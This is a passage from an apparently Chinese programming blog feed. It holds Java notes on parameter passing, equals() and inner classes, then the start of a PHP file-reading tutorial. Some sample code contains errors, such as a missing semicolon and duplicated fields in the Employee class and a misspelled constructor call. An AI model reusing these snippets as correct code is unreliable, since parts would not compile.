(4) 📒成员变量如果没有赋初值，则会自动以该类型的默认值（0,false,null等）赋值；而局部变量则不会
     自动赋值，必须显示地赋值后才能使用。 
</font></td></tr></table>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">class A&#123;</span><br><span class="line">         int a;</span><br><span class="line">         void <span class="function"><span class="title">m</span></span>()&#123;</span><br><span class="line">            int b;</span><br><span class="line">            System.out.println(a);  //合法的，a的值为0</span><br><span class="line">            System.out.println(b);  //不合法，编译不通过</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-3-变量的传递"><a href="#1-3-变量的传递" class="headerlink" title="1.3  变量的传递"></a><font color="#20B2AA" face="Comic sans MS">1.3  变量的传递</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 📒按值传递:</strong></font>当将一个参数传递给一个函数时，函数接收的是原始值的一个副本。因此，如果函数修改了该参数，仅改变副本，而原始值保持不变。(传递8种基本型变量)<br><font color="red"><strong>2. 📒按引用传递:</strong></font>当将一个参数传递给一个函数时，函数接收的原始值的内存地址，而不是值的副本，因此，如果修改了该参数，调用代码中的原始值也随之改变。(传递对象,接口,数组)<br><font color="#00B2EE"><em>Java中的参数传递比C++简单,按值传递所有参数,制作所有参数的副本,而不管它们的类型。</em></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例1：</span><br><span class="line">class TestTransOfValue</span><br><span class="line">&#123;</span><br><span class="line">  public static void main(String args[])</span><br><span class="line">  &#123;</span><br><span class="line">    int val;</span><br><span class="line">    StringBuffer sb1, sb2;</span><br><span class="line">    val = 10;</span><br><span class="line">    sb1 = new StringBuffer(<span class="string">&quot;apples&quot;</span>);</span><br><span class="line">    sb2 = new StringBuffer(<span class="string">&quot;pears&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;val is &quot;</span> + val);</span><br><span class="line">    System.out.println(<span class="string">&quot;sb1 is &quot;</span> + sb1);</span><br><span class="line">    System.out.println(<span class="string">&quot;sb2 is &quot;</span> + sb2);</span><br><span class="line">    System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;calling modify&quot;</span>);</span><br><span class="line">    //按值传递所有参数</span><br><span class="line">    modify(val, sb1, sb2);</span><br><span class="line">    System.out.println(<span class="string">&quot;returned from modify&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;val is &quot;</span> + val);</span><br><span class="line">    System.out.println(<span class="string">&quot;sb1 is &quot;</span> + sb1);</span><br><span class="line">    System.out.println(<span class="string">&quot;sb2 is &quot;</span> + sb2);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">public static void modify(int a, StringBuffer r1,</span><br><span class="line">                         StringBuffer r2)</span><br><span class="line">  &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;in modify...&quot;</span>);</span><br><span class="line">    //在方法中修改基本类型变量的值</span><br><span class="line">    a = 0;  </span><br><span class="line">    //在方法中修改对象引用值的副本</span><br><span class="line">    r1 = null;  //1</span><br><span class="line">    //在方法中修改副本的对象实体值</span><br><span class="line">    r2.append(<span class="string">&quot; taste good&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;a is &quot;</span> + a);</span><br><span class="line">    System.out.println(<span class="string">&quot;r1 is &quot;</span> + r1);</span><br><span class="line">    System.out.println(<span class="string">&quot;r2 is &quot;</span> + r2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">运行后输出：</span><br><span class="line">val is 10</span><br><span class="line">sb1 is apples</span><br><span class="line">sb2 is pears</span><br><span class="line">calling modify <span class="keyword">in</span> modify...</span><br><span class="line">a is 0</span><br><span class="line">r1 is null</span><br><span class="line">r2 is pears taste good </span><br><span class="line">returned from modify</span><br><span class="line">val is 10</span><br><span class="line">sb1 is apples</span><br><span class="line">sb2 is pears taste good </span><br><span class="line">/*关于这里的sb1和r1：</span><br><span class="line">当参数传到modify后，r1和sb1指向同一个地址，若改变了r1指向的地址，并不会更改sb1指向的地址。这个时候就</span><br><span class="line">相当于看作两个指针了。</span><br><span class="line">关于sb2和r2：</span><br><span class="line">sb2和r2指向同一个地址，这个地址指向的值(实体值)被改变了，则结束后sb2和r2的实体值也就相应的改变了。</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
<p><img data-src="https://i.loli.net/2018/12/28/5c2500f374fbd.png" alt="FX.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例2：</span><br><span class="line">class Swap</span><br><span class="line">&#123; </span><br><span class="line"> public static void main(String args[])</span><br><span class="line">  &#123;</span><br><span class="line">    Integer a, b;</span><br><span class="line">    a = new Integer(10);</span><br><span class="line">    b = new Integer(50);</span><br><span class="line">    System.out.println(<span class="string">&quot;before swap...&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;a is &quot;</span> + a);</span><br><span class="line">    System.out.println(<span class="string">&quot;b is &quot;</span> + b);</span><br><span class="line">    swap(a, b);</span><br><span class="line">    System.out.println(<span class="string">&quot;after swap...&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;a is &quot;</span> + a);</span><br><span class="line">    System.out.println(<span class="string">&quot;b is &quot;</span> + b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> public static void swap(Integer a, Integer b)</span><br><span class="line">  &#123;</span><br><span class="line">    Integer temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">    System.out.println(<span class="string">&quot;in swap...&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;a is &quot;</span> + a);</span><br><span class="line">    System.out.println(<span class="string">&quot;b is &quot;</span> + b);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">运行后输出：</span><br><span class="line">before swap...</span><br><span class="line">a is 10</span><br><span class="line">b is 50</span><br><span class="line"><span class="keyword">in</span> swap…</span><br><span class="line">a is 50</span><br><span class="line">b is 10</span><br><span class="line">after swap...</span><br><span class="line">a is 10</span><br><span class="line">b is 50 </span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**参数传递总结：**</font>
 (1) Java按值传递所有参数,制作所有参数的副本,而不管它们的类型
 (2) 对于基本类型的变量形参修改了并不能反映到函数外面的实参
 (3) 对于引用类型的变量，在形参中修改了对象实体值可以反映到实参，在形参中修改了对象引用值，
     不能反映到实参
</font></td></tr></table>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-4-引用型变量的实体值、引用值比较"><a href="#1-4-引用型变量的实体值、引用值比较" class="headerlink" title="1.4  引用型变量的实体值、引用值比较"></a><font color="#20B2AA" face="Comic sans MS">1.4  引用型变量的实体值、引用值比较</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 📒参数传递总结：</strong></font><br> (1) 比较基本类型的数据: &#x3D;&#x3D;和!&#x3D;<br> (2) 如果要比较引用型变量是否相同,可以直接用&#x3D;&#x3D;和!&#x3D;吗?<font color="red">  <strong>答：不能</strong></p>
<p><strong>&#x3D;&#x3D;和!&#x3D;用来比较引用型变量时（只能比较引用值（地址）是不是相等）,只能判断运算符两边引用的是不是同一个对象,即对象的地址值（或对象引用值）！！！！！</strong></font><br><font color="#00B2EE"><strong>如何比较两个对象的内容(对象实体值)是否相同?<br>用equls()方法：</strong></font><br></font></p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**2. 📒引用型变量比较总结：**</font>
 (1) 比较两个变量是否同一个对象（即对象引用值是否相同），用==和!=
 (2) 比较两个变量的内容是否相同用equals方法
 (3) **自己定义的类如果要支持equals方法必须重写从Object类继承来的equals方法(比如前面的String类
 是java自己的类就不需要重写equals，但是Employee类就是自己定义的类则需要重写equals)**

<p><strong>Object类中的equals方法：</strong><br> <em>public boolean equals(Object obj){<br>   return (this&#x3D;&#x3D;obj);<br> }</em><br></font></td></tr></table></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">equals示例1:</span><br><span class="line">class EqualsTest&#123;</span><br><span class="line">  public static void main(String[] arguments)</span><br><span class="line">  &#123;</span><br><span class="line">     String str1,str2;</span><br><span class="line">     str1=<span class="string">&quot;Free the bound periodicals.&quot;</span>;</span><br><span class="line">     str2=str1;</span><br><span class="line">     System.out.println(<span class="string">&quot;String1: &quot;</span>+str1);</span><br><span class="line">     System.out.println(<span class="string">&quot;String2: &quot;</span>+str2);</span><br><span class="line">     System.out.println(<span class="string">&quot;Same object? &quot;</span>+(str1==str2));      //<span class="literal">true</span></span><br><span class="line">     str2=new String(str1);</span><br><span class="line">     System.out.println(<span class="string">&quot;String1: &quot;</span>+str1);</span><br><span class="line">     System.out.println(<span class="string">&quot;String2: &quot;</span>+str2);</span><br><span class="line">     System.out.println(<span class="string">&quot;Same object? &quot;</span>+(str1==str2));      //<span class="literal">false</span></span><br><span class="line">     System.out.println(<span class="string">&quot;Same value? &quot;</span>+str1.equals(str2));  //<span class="literal">true</span></span><br><span class="line">     String str3,str4;</span><br><span class="line">     str3=<span class="string">&quot;busy&quot;</span>;</span><br><span class="line">     str4=<span class="string">&quot;busy&quot;</span>; //str4=new String(<span class="string">&quot;busy&quot;</span>)或str4=new String(str3) </span><br><span class="line">     System.out.println(<span class="string">&quot;String3: &quot;</span>+str3);</span><br><span class="line">     System.out.println(<span class="string">&quot;String4: &quot;</span>+str4);</span><br><span class="line">     System.out.println(<span class="string">&quot;Same object? &quot;</span>+(str3==str4));       //<span class="literal">true</span></span><br><span class="line">     System.out.println(<span class="string">&quot;Same value? &quot;</span>+str3.equals(str4));   //<span class="literal">true</span> </span><br><span class="line">     String str5,str6;</span><br><span class="line">     str5=<span class="string">&quot;str5busy&quot;</span>;</span><br><span class="line">     str6=<span class="string">&quot;str6busy&quot;</span>;</span><br><span class="line">     System.out.println(<span class="string">&quot;String5: &quot;</span>+str5);</span><br><span class="line">     System.out.println(<span class="string">&quot;String6: &quot;</span>+str6);</span><br><span class="line">     System.out.println(<span class="string">&quot;Same object? &quot;</span>+(str5==str6));      //<span class="literal">false</span></span><br><span class="line">     System.out.println(<span class="string">&quot;Same value? &quot;</span>+str5.equals(str6));  //<span class="literal">false</span> 	</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">equals示例2：</span><br><span class="line">import java.util.*;</span><br><span class="line">public class EqualsTest &#123;</span><br><span class="line">     public <span class="function"><span class="title">EqualsTest</span></span>() &#123;    &#125;    </span><br><span class="line">     public static void main(String[] args)&#123;</span><br><span class="line">     Employee alice1=new Employee(<span class="string">&quot;Alice&quot;</span>,75000,1987,12,15);</span><br><span class="line">     Employee alice2=alice1;</span><br><span class="line">     Employee alice3=new Employee(<span class="string">&quot;Alice&quot;</span>,75000,1987,12,15);</span><br><span class="line">     Employee bob=new Employee(<span class="string">&quot;Bob&quot;</span>,50000,1989,10,1);</span><br><span class="line">     System.out.println(<span class="string">&quot;alice1==alice2: &quot;</span>+(alice1==alice2));    //<span class="literal">true</span></span><br><span class="line">     System.out.println(<span class="string">&quot;alice1==alice3: &quot;</span>+(alice1==alice3));    //<span class="literal">false</span> </span><br><span class="line">     System.out.println(<span class="string">&quot;alice1.equals(alice3): &quot;</span>+alice1.equals(alice3));  //<span class="literal">true</span></span><br><span class="line">     System.out.println(<span class="string">&quot;alice1.equals(bob): &quot;</span>+alice1.equals(bob));   //<span class="literal">false</span> </span><br><span class="line">     System.out.println(<span class="string">&quot;bob.toString(): &quot;</span>+bob);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Employee&#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private double salary;</span><br><span class="line">    private Date hireDay; </span><br><span class="line">    public Employee(String n,double s,int year,int month,int day)&#123;</span><br><span class="line">            name=n;</span><br><span class="line">            salary=s</span><br><span class="line">        hireDay=new Date(year,month,day);</span><br><span class="line">    &#125;</span><br><span class="line">    public String <span class="function"><span class="title">getName</span></span>()&#123;     <span class="built_in">return</span> name;     &#125;</span><br><span class="line">    public double <span class="function"><span class="title">getSalary</span></span>()&#123;   <span class="built_in">return</span> salary;    &#125;</span><br><span class="line">    public Date <span class="function"><span class="title">getHireDay</span></span>()&#123;   <span class="built_in">return</span> hireDay; &#125;</span><br><span class="line">    public void raiseSalary(double byPercent)&#123;</span><br><span class="line">            double raise=salary*byPercent/100;</span><br><span class="line">            salary+=raise;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">public boolean equals(Object otherObject)&#123;     //子类覆盖了Object的equals方法</span><br><span class="line">  <span class="keyword">if</span>(this==otherObject) <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">if</span>(otherObject==null) <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span>(getClass()!=otherObject.getClass())</span><br><span class="line">  <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">  Employee other=(Employee)otherObject;</span><br><span class="line">  <span class="built_in">return</span> name.equals(other.name)&amp;&amp;</span><br><span class="line">              salary==other.salary&amp;&amp;hireDay.equals(other.hireDay); </span><br><span class="line">                        //子类覆盖了Object的toString方法</span><br><span class="line"> &#125;</span><br><span class="line"> public String <span class="function"><span class="title">toString</span></span>()&#123;</span><br><span class="line">  <span class="built_in">return</span> getClass().getName()+</span><br><span class="line">           <span class="string">&quot;[name=&quot;</span>+name+<span class="string">&quot;,salary=&quot;</span>+salary+<span class="string">&quot;,hireDay=&quot;</span>+hireDay+<span class="string">&quot;]&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> private String name;</span><br><span class="line"> private double salary;</span><br><span class="line"> private Date hireDay;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="二、-内部类"><a href="#二、-内部类" class="headerlink" title="二、 内部类"></a><font color="#FF6347" face="Comic sans MS">二、 内部类</font></h3><h4 id="2-1-内部类的定义与使用"><a href="#2-1-内部类的定义与使用" class="headerlink" title="2.1  内部类的定义与使用"></a><font color="#20B2AA" face="Comic sans MS">2.1  内部类的定义与使用</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 📒内部类的定义：</strong></font>将类的定义置入一个用于封装它的类（外部类）里。<br>    <font color="#00B2EE"><strong>注意：</strong></font><br>    内部类不能与外部类同名（否则，编译器无法区分内部类与外部类），如果内部类还有内部类，内部类的内部类不能与它的任何一层外部类同名。<br>    <font color="#00B2EE"><strong>作用：</strong></font><br>    逻辑分组, 隐藏细节<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/*内部类结合多态可以很方便的隐藏类的细节(包括类名)</span><br><span class="line">*/</span><br><span class="line">interface Contents&#123;</span><br><span class="line">  int value();</span><br><span class="line">&#125;</span><br><span class="line">interface Destination &#123;</span><br><span class="line">  String readLabel();</span><br><span class="line">&#125;</span><br><span class="line">class Goods&#123;</span><br><span class="line">    private class Content implements Contents&#123;  //<span class="string">&quot;private class Contentimplements Contents&quot;</span> </span><br><span class="line">        private int i=11;</span><br><span class="line">        public int <span class="function"><span class="title">value</span></span>()&#123;</span><br><span class="line">  <span class="built_in">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    protected class GDestination    //<span class="string">&quot;protected class GDestination implements Destination&quot;</span></span><br><span class="line">    implements Destination&#123;</span><br><span class="line">      private String label;</span><br><span class="line">  private GDestination(String whereTo)&#123;</span><br><span class="line">    label=whereTo;</span><br><span class="line">  &#125;</span><br><span class="line">public String <span class="function"><span class="title">readLabel</span></span>()&#123;</span><br><span class="line">    <span class="built_in">return</span> label;&#125;&#125;</span><br><span class="line">public Contents <span class="function"><span class="title">cont</span></span>()&#123;</span><br><span class="line">  <span class="built_in">return</span> new Content();</span><br><span class="line">  &#125;</span><br><span class="line">public Destination dest(String s)&#123;</span><br><span class="line">  <span class="built_in">return</span> new GDestination(s);</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">public class TestGoods &#123;   //<span class="string">&quot;public class TestGoods&quot;</span></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">         Goods g=new Goods();</span><br><span class="line">         Contents c=g.cont();</span><br><span class="line">         Destination d=g.dest(<span class="string">&quot;Beijing&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font face="Comic sans MS"><font color="red"><strong>2. 📒内部类对象的创建：</strong></font>创建非静态内部类的对象时一定要确保已经有一个外部类对象。<br>(1) 利用外部类的方法创建并返回，因为方法是由外部类对象调用的，那创建该内部类对象时，一定已经拥有了所属的外部类对象了<br>public Contents cont(){  &amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;       Goods g&#x3D;new Goods();<br>  return new Content();  &amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;ensp;        Contents c&#x3D;g.cont();<br>}</p>
<p>(2) 创建内部类还可以在除外部类中的其它类中，但是要确保该类具有访问内部类的权限，并且已经创建了一个外部类对象。格式如下：<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">outerObject=new outerClass(Constructor Parameters);</span><br><span class="line">outerClass.innerClass innerObject = outerObject.new InnerClass(Constructor Parameters);</span><br><span class="line"></span><br><span class="line"> Goods g1=new Goods();</span><br><span class="line"> Goods.Content c1=g.new Content(); </span><br><span class="line">OR</span><br><span class="line"> Goods g1=new Goods();</span><br><span class="line"> Goods.GDestination d1=g1.new GDestionation(); </span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. 📒内部类的修饰符：</strong></font><br>（1）<font color="red"><strong>public、protected、private和缺省：</strong></font>访问权限修饰符，用来限定内部类的访问权限，<br>  &amp;emsp;&amp;emsp;一般的外部类是不能用protected和private修饰的。访问权限修饰符的限定和成员变量的限定一样。<br>（2）<font color="red"><strong>final:</strong></font>表明内部类不能继承。<br>（3）<font color="red"><strong>abstract：</strong></font>抽象内部类，不能被实例化。<br>（4）<font color="red"><strong>static：</strong></font>表明一个静态内部类。</p>
<p><font face="Comic sans MS"><font color="red"><strong>4. 📒静态内部类：</strong></font><br><strong>和普通的非静态内部类有较大的不同，使用时要遵循如下原则：</strong><br>（1）实例化static内部类时，在new前面不需要用对象变量；<br><font color="red"><strong>（2）static内部类中不能访问其外部类的非static属性及方法，即只能访问static成员；<br>（3）static方法中不能访问非static的属性及方法，也不能不带前缀地new一个非static的内部类。</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">      private int x;</span><br><span class="line">      void <span class="function"><span class="title">m</span></span>()&#123;</span><br><span class="line">  new B();</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     static void <span class="function"><span class="title">sm</span></span>()&#123;</span><br><span class="line">      //在外部类的静态方法中</span><br><span class="line">     //不能直接创建内部类对象</span><br><span class="line">     //new B();//!!error</span><br><span class="line">    &#125;</span><br><span class="line">class B</span><br><span class="line">&#123;</span><br><span class="line">      <span class="function"><span class="title">B</span></span>()&#123;x=5;&#125;</span><br><span class="line">  &#125;//B类结束</span><br><span class="line">&#125;//A类结束</span><br><span class="line">class Outer</span><br><span class="line">&#123;</span><br><span class="line">  static class Inner</span><br><span class="line">  &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TestInnerStatic</span><br><span class="line">&#123;</span><br><span class="line">  public static void main(String[] args)  </span><br><span class="line">  &#123;</span><br><span class="line">    //创建非静态内部类B的对象a_b和ab</span><br><span class="line">    A.B a_b=new A().new B();</span><br><span class="line">    A a=new A();</span><br><span class="line">    A.B ab=a.new B();</span><br><span class="line">    </span><br><span class="line">    //创建静态内部类Inner的对象oi，不需要外部类Outer的对象</span><br><span class="line">    Outer.Inner oi=new Outer.Inner();</span><br><span class="line">    //Outer.Inner oi2=Outer.new Inner();//!!error</span><br><span class="line">    //Outer.Inner oi3=new Outer().new Inner();//!!error</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>5. 📒内部类中访问外部类的成员：</strong></font><br>(1) 内部类中是可以直接访问外部类的其他属性与方法的，即使它们是private的。<br>(2) 如果内部类中有与外部类同名的属性与方法，可以使用下面的格式来表达外部类的引用，从而区分外部类和内部类的同名的属性与方法：<br>                       outerClass.this<br></font> </p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-2-方法和作用域中的内部类"><a href="#2-2-方法和作用域中的内部类" class="headerlink" title="2.2  方法和作用域中的内部类"></a><font color="#20B2AA" face="Comic sans MS">2.2  方法和作用域中的内部类</font></h4><p><font face="Comic sans MS"><font color="red"><strong>内部类也可以是局部的，它可以定义在一个方法甚至一个代码块之内。</strong></font><br>(1) 内部类中是可以直接访问外部类的其他属性与方法的，即使它们是private的。<br>(2) 如果内部类中有与外部类同名的属性与方法，可以使用下面的格式来表达外部类的引用，从而区分外部类和内部类的同名的属性与方法：<br>                       outerClass.this<br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例1: 方法中的内部类:</span><br><span class="line">interface Destination &#123;</span><br><span class="line">  String readLabel();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class Goods2 &#123;</span><br><span class="line">  String a=<span class="string">&quot;Goods2&quot;</span>;</span><br><span class="line">     public Destination dest(String s) &#123;</span><br><span class="line">          class GDestination implements Destination &#123;</span><br><span class="line">            private String label;</span><br><span class="line">            private GDestination(String whereTo) &#123;</span><br><span class="line">             label = whereTo;</span><br><span class="line">             System.out.println(<span class="string">&quot;access outer class:&quot;</span>+a);</span><br><span class="line">               &#125;</span><br><span class="line">               public String <span class="function"><span class="title">readLabel</span></span>() &#123; <span class="built_in">return</span> label; &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">return</span> new GDestination(s);</span><br><span class="line">     &#125;</span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">          Goods2 g= new Goods2();</span><br><span class="line">          Destination d = g.dest(<span class="string">&quot;Beijing&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line">/*在方法dest（）中定义了一个内部类，最后由这个方法返回这个内部类的对象。如果在用一个内部类的时候仅需要创建它的一个对象并传给外部，就可以这样做。</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>方法中定义内部类的注意点:</strong></font><br> (1) 方法中定义的类，在其它地方使用时，没有类的名字，一般用其父类来引用这样的变量。<br> (2) 同局部变量一样，方法中的内部类前面不能用public，private，protected修饰，也不能用static修饰，但可以被final或abstract修饰。<br> (3) 方法中的内部类，可以访问其外部类的成员;若是static方法中的内部类，可以访问外部类的static成员。<br> (4) 方法中的内部类中，不能访问该方法的局部变量，除非是final的局部变量。<br></font></p>
<p>&amp;emsp;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例2: 作用域中的内部类:</span><br><span class="line">public class Goods3&#123;</span><br><span class="line">     private void internalTracking(boolean b) &#123;</span><br><span class="line">          <span class="keyword">if</span>(b) &#123;</span><br><span class="line">               class TrackingSlip &#123;</span><br><span class="line">                    private String id;</span><br><span class="line">                    TrackingSlip(String s) &#123;</span><br><span class="line">                         id = s;</span><br><span class="line">                    &#125;</span><br><span class="line">                    String <span class="function"><span class="title">getSlip</span></span>() &#123; <span class="built_in">return</span> id; &#125;</span><br><span class="line">               &#125;</span><br><span class="line">              TrackingSlip ts = new TrackingSlip(<span class="string">&quot;slip&quot;</span>);</span><br><span class="line">               String s = ts.getSlip();</span><br><span class="line">          &#125; </span><br><span class="line">     &#125;</span><br><span class="line"> public void <span class="function"><span class="title">track</span></span>() &#123; internalTracking(<span class="literal">true</span>); &#125;</span><br><span class="line">     public static void main(String[] args) &#123;</span><br><span class="line">          Goods3 g= new Goods3();</span><br><span class="line">          g.track();</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-3-匿名内部类"><a href="#2-3-匿名内部类" class="headerlink" title="2.3  匿名内部类 "></a><font color="#20B2AA" face="Comic sans MS">2.3  匿名内部类 </font></h4><p><font face="Comic sans MS"><font color="red"><strong>匿名类：</strong></font> 类或方法中定义的一种没有类名的特殊内部类。<br><font color="red"><strong>作用：</strong></font>当需要创建一个类的对象而且用不上它的名字时，使用内部类可以使代码看上去简洁清楚。<br><font color="red"><strong>语法规则如下：</strong></font><br>       new interfacename(){……};<br>      或new superclassname(){……};</p>
<p><font color="red"><strong>注意：</strong></font><br> (1) 这种类不取名字，而直接用其父类的名字或者它所实现的接口的名字；<br> (2) 类的定义与创建该类的一个对象同时进行，即类的定义前面有一个new，没有类的首部，对象的创建和类体共同构成一个匿名类表达式，后面以“;”结束；<br> (3) 类中不能定义构造方法，因为它没有名字。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">interface Contents&#123;</span><br><span class="line">  int value();</span><br><span class="line">&#125;</span><br><span class="line">public class Goods4 &#123;</span><br><span class="line">     public Contents <span class="function"><span class="title">cont</span></span>()&#123;</span><br><span class="line">          //返回匿名类对象，该匿名类继承了Contents接口</span><br><span class="line">          <span class="built_in">return</span> new <span class="function"><span class="title">Contents</span></span>()&#123;</span><br><span class="line">               private int i = 11;</span><br><span class="line">               public int <span class="function"><span class="title">value</span></span>() &#123; </span><br><span class="line">                    <span class="built_in">return</span> i; </span><br><span class="line">               &#125;</span><br><span class="line">          &#125;;</span><br><span class="line">     &#125;</span><br><span class="line"> public static void main(String[] args)</span><br><span class="line">     &#123;</span><br><span class="line">      Goods4 g=new Goods4();</span><br><span class="line">      Contents c=g.cont();</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<p>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-文件系统</title>
    <url>/post/PHP-FileSystem/</url>
    <content><![CDATA[<p>学习文件处理本质上面就是学习<font color="#00B2EE"><strong>文件处理的函数。</strong></font> ヾ(๑╹◡╹)ﾉ”</p>
<span id="more"></span>

<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>PHP 文件系统</font></center>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="一-读取文件"><a href="#一-读取文件" class="headerlink" title="一. 读取文件"></a><font color="#FF6347" face="Comic sans MS">一. 读取文件</font></h3><p>&amp;emsp;</p>
<h4 id="1-1-readfile读取文件"><a href="#1-1-readfile读取文件" class="headerlink" title="1.1 readfile读取文件"></a><font color="#3CB371" face="Comic sans MS">1.1 readfile读取文件</font></h4><p>读取一个文件内容的函数：<font color="#00B2EE" face="Comic sans MS"><strong>int readfile ( string $文件名)</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>功能：传入一个文件路径，输出这个文件里面的内容。</strong></font></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //linux类的读取方式</span><br><span class="line">   readfile(<span class="string">&quot;/home/paul/test.txt&quot;</span>);</span><br><span class="line">   //windows类的读取方式</span><br><span class="line">   readfile(<span class="string">&quot;c:\\boot.ini&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意：</strong>上面的代码中windows的斜线是\斜线，可能会转义掉一些字符。因此，我们写的时候写上两个斜线。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-2-file-get-contents打开文件"><a href="#1-2-file-get-contents打开文件" class="headerlink" title="1.2 file_get_contents打开文件"></a><font color="#3CB371" face="Comic sans MS">1.2 file_get_contents打开文件</font></h4><p><font face="Comic sans MS">上面的是单纯打文件就直接输出了，有没有打开文件后，能够赋值给一个变量的操作方式呢。</font><br><font color="#00B2EE" face="Comic sans MS"><strong>string file_get_contents ( string filename)</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>功能：传入一个文件或文件路径，打开这个文件<font color="#00B2EE">返回</font>文件的内容。文件的内容是一个字符串。</strong></font></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">   <span class="variable">$filename</span> = <span class="string">&#x27;NoAlike.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$filestring</span> = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">   <span class="built_in">echo</span> <span class="variable">$filestring</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>上面的代码，就打开了一个文件，并且将文件当中的内容进行了输出。</p>
</blockquote>
<p>&amp;emsp;<br>我们来针对之前的知识把代码进行一下扩展。用一用之前的知识点。</p>
